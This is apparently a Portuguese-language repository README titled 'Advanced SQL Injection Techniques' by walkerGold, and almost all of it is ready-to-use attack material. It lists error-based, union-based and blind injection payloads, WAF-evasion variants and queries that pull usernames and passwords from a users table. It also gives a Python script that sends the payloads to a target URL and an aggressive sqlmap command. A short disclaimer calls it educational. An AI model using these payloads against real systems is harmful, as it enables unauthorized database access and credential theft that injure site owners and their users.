Advanced SQL Injection Techniques by walkerGold



🚨 Disclaimer

Este repositório é apenas para fins educacionais e deve ser utilizado exclusivamente em ambientes autorizados. O uso indevido dessas técnicas pode causar danos a bancos de dados. Use por sua conta e risco.

📌 Sobre

Aqui estão algumas técnicas avançadas de SQL Injection frequentemente utilizadas. Essas técnicas vão além do básico e exploram configurações específicas dos bancos de dados.

⚠ Aviso: Se você não sabe o que está fazendo, não utilize essas técnicas.

🛠 Técnicas Avançadas de SQL Injection

🔹 Error-Based SQL Injection

' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- -

🔹 Union-Based Injection

Descobrindo o número de colunas:

' UNION SELECT NULL, NULL, NULL, NULL --

Extraindo dados:

' UNION SELECT username, password, NULL, NULL FROM users --

🔹 Blind SQL Injection

Boolean-Based Blind:

' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END) --

Time-Based Blind:

' AND IF(1=1, SLEEP(5), 0) --

🔹 Bypassing WAFs e Filtros

Utilizando Comentários:

' UNION/**/SELECT/**/NULL,NULL,NULL --

Manipulação de Case:

' uNioN SeLecT NULL, NULL --

Uso de Caracteres Especiais:

' UNION SELECT CHAR(117,115,101,114,110,97,109,101), CHAR(112,97,115,115,119,111,114,100) --

🔹 Extração de Dados

Extraindo Nomes de Colunas:

' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --

Agrupando Resultados:

' UNION SELECT GROUP_CONCAT(username, 0x3a, password) FROM users --

🖥 Automação com Scripts

Exemplo de Script Python:

import requests

url = "http://example.com/vulnerable.php"
payloads = [
    "' UNION SELECT 1, version(), database(), user() FROM dual --",
    "' AND IF((SELECT LENGTH(database()))>5, SLEEP(5), 0) --"
]

for payload in payloads:
    response = requests.get(url, params={"id": payload})
    print(f"Payload: {payload}\nResponse: {response.text}\n")

⚙️ Uso com SQLMap

Executando SQLMap com Scripts Customizados:

sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper=random_urlencode --level=5 --risk=3

📢 Contato

Para mais conteúdos, siga walkerGold


---

⚠ Lembre-se: Não ataque sistemas sem permissão. Todas as técnicas são apenas para fins educacionais e legais.

